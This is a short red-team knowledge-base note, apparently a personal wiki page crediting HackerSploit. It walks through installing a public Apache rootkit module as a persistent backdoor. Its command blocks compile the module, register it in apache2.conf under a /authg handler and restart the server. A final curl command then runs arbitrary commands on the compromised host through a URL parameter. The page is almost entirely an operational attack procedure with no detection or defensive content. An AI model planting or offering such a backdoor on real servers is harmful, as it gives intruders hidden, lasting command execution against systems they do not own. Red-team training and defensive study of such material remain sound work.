---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
credits:
  - HackerSploit
---
# Apache Rootkit

## Prerequisites

### Dependencies

Install the required dependencies according to your distribution.

```
$ sudo apt-get install apache2-dev
```

### Compile

```
$ git clone https://github.com/ChristianPapathanasiou/apache-rootkit.git && \
cd apache-rootkit/ && apxs -c -i mod_authg.c
```

## Install Rootkit

```
# cp mod_authg.so /usr/lib/apache2/modules/

# chmod 644 /usr/lib/apache2/modules/mod_authg.so
```

Add the lines in the apache2 configuration file.

```
# nano /etc/apache2/apache2.conf
LoadModule authg_module /usr/lib/apache2/modules/mod_authg.so
<Location /authg>
SetHandler authg
</Location>
..[omitted]..
```

Restart the web server to load the module.

```
$ sudo systemctl restart apache2
```

Execute commands on the backdoored web server with a new URI handle.

```
$ curl -A <user_agent> http[s]://<target_IP>[:<PORT>]/authg?c=<commands>
```

---
## References

### Backlinks

- [[Linux Post Exploitation Persistence References]]

### Github

- [apache-rootkit](https://github.com/ChristianPapathanasiou/apache-rootkit)

### HackerSploit

- [HackerSploit: Linux Red Team Defense Evasion - Apache2 Rootkit](https://hackersploit.org/linux-red-team-defense-evasion-apache2-rootkit/)